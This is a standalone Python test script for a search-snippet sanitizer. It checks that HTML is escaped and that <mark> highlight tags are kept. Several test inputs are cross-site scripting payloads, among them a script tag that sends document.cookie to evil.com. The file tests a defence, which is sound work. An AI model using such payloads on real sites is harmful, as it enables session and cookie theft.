#!/usr/bin/env python3
"""Standalone test for sanitizer functionality without pytest."""

import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from backend.src.services.sanitizer import sanitize_snippet


def test_case(name: str, snippet: str, expected_contains: list, expected_not_contains: list):
    """Run a test case and print results."""
    result = sanitize_snippet(snippet)
    passed = True

    for text in expected_contains:
        if text not in result:
            print(f"✗ {name}: FAILED - Expected '{text}' in result")
            print(f"  Result: {result}")
            passed = False

    for text in expected_not_contains:
        if text in result:
            print(f"✗ {name}: FAILED - Did not expect '{text}' in result")
            print(f"  Result: {result}")
            passed = False

    if passed:
        print(f"✓ {name}: PASSED")

    return passed


def main():
    """Run all tests."""
    print("Running standalone sanitizer tests...\n")

    all_passed = True

    # Test 1: Normal text
    all_passed &= test_case(
        "Normal text",
        "This is a simple text snippet",
        ["This is a simple text snippet"],
        []
    )

    # Test 2: Mark tags are preserved
    all_passed &= test_case(
        "Mark tags preserved",
        "This is a <mark>highlighted</mark> word",
        ["<mark>highlighted</mark>"],
        []
    )

    # Test 3: Script tags are escaped
    all_passed &= test_case(
        "Script tags escaped",
        "<script>alert('xss')</script> normal text",
        ["&lt;script&gt;", "&lt;/script&gt;"],
        ["<script>"]
    )

    # Test 4: Script with mark tags
    all_passed &= test_case(
        "Script escaped, mark preserved",
        "<script>alert('xss')</script> <mark>test</mark>",
        ["&lt;script&gt;", "&lt;/script&gt;", "<mark>test</mark>"],
        ["<script>"]
    )

    # Test 5: Event handlers
    all_passed &= test_case(
        "Event handlers escaped",
        "<img onerror=alert(1) src=x> <mark>text</mark>",
        ["&lt;img", "&gt;", "<mark>text</mark>"],
        []
    )

    # Test 6: Special characters
    all_passed &= test_case(
        "Special characters escaped",
        "Use & symbol, also < and > in text",
        ["&amp;", "&lt;", "&gt;"],
        []
    )

    # Test 7: Complex XSS attempt
    all_passed &= test_case(
        "Complex XSS escaped",
        "<script>fetch('http://evil.com?cookie='+document.cookie)</script> <mark>search</mark>",
        ["&lt;script&gt;", "&lt;/script&gt;", "<mark>search</mark>"],
        ["<script>"]
    )

    # Test 8: Multiple mark tags
    all_passed &= test_case(
        "Multiple mark tags",
        "<mark>First</mark> match and <mark>second</mark> match",
        ["<mark>First</mark>", "<mark>second</mark>"],
        []
    )

    # Test 9: Empty string
    all_passed &= test_case(
        "Empty string",
        "",
        [""],
        []
    )

    # Test 10: Real-world snippet
    all_passed &= test_case(
        "Real-world snippet",
        "Function definition: <mark>async</mark> def process_data(input: str) -> None:",
        ["<mark>async</mark>", "-&gt;"],
        []
    )

    print("\n" + "="*60)
    if all_passed:
        print("✓ ALL TESTS PASSED")
        return 0
    else:
        print("✗ SOME TESTS FAILED")
        return 1


if __name__ == "__main__":
    sys.exit(main())
